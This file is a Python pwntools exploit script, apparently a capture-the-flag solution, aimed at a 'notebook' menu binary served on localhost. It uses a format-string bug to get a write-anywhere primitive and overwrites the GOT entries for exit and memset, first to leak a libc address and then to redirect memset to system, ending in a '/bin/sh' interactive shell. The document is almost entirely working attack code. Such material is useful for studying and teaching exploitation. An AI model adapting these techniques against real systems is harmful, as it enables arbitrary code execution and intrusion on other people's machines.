#!/usr/bin/python2
from pwn import *

context.binary = ELF('./src/notebook')

def start(is_remote=False):
    if is_remote:
        return remote("localhost", 6002)
    return process([context.binary.path, "log.txt"])

def report_bug(msg):
    p.sendlineafter("Exit\n> ", "4")
    p.sendlineafter("bug you found.\n> ", msg)

def create_contact(name, phone_number):
    p.sendlineafter("Exit\n> ", "1")
    p.sendlineafter("name?\n> ", name)
    p.sendlineafter("number?\n> ", phone_number)

def delete_contact(index):
    p.sendlineafter("Exit\n> ", "3")
    p.sendlineafter("delete?\n> ", str(index))

# where = address (int)
# what  = data (str)
def write_anywhere(where, what):
    RET_ADDR = 0x40109E
    EXIT_GOT = 0x6020A0

    if not write_anywhere.init_done:
        # exit => leave, ret (go back to main loop)
        payload  = "%{}u%14$hn".format((RET_ADDR&0xffff)-0x1C).rjust(18)
        payload += p64(EXIT_GOT)
        report_bug(payload)
        write_anywhere.init_done = True

    if len(what) % 2:
        what += "\0"
    chunks = [what[i:i+2] for i in range(0, len(what), 2)]
    for index, chunk in enumerate(chunks):
        val = int(chunk[::-1].encode('hex'), 16)
        if val < 0x1B:
            val = int("0x1" + hex(val)[2:].rjust(4, "0"), 16)
        val -= 32 - len(str(val))
        payload = "%{}u%14$hn".format(val).rjust(18)
        payload += p64(where+2*index)
        report_bug(payload)
write_anywhere.init_done = False


p = start(True)

# memset => printf (allow format string attack in printf with contact name as format)
MEMSET_GOT = 0x602040
PRINTF_PLT = 0x4008B0
write_anywhere(MEMSET_GOT, p64(PRINTF_PLT))

# leak __libc_start_main_ret
contact_name_1 = "%17$p"
create_contact(contact_name_1, "")
delete_contact(1)
libc_start_main_ret = p.recvuntil("Contact", drop=True)
log.success("libc_start_main_ret: " + libc_start_main_ret)

# using https://github.com/niklasb/libc-database, we found that
# system was 0x2D8A9 bytes from __libc_start_main_ret in the libc used
# by the remote server
SYSTEM = int(libc_start_main_ret, 16) + 0x2D8A9

# memset => system (so we can get shell)
write_anywhere(MEMSET_GOT, p64(SYSTEM))

contact_name_2 = "/bin/sh"
create_contact(contact_name_2, "")
delete_contact(2)

p.interactive()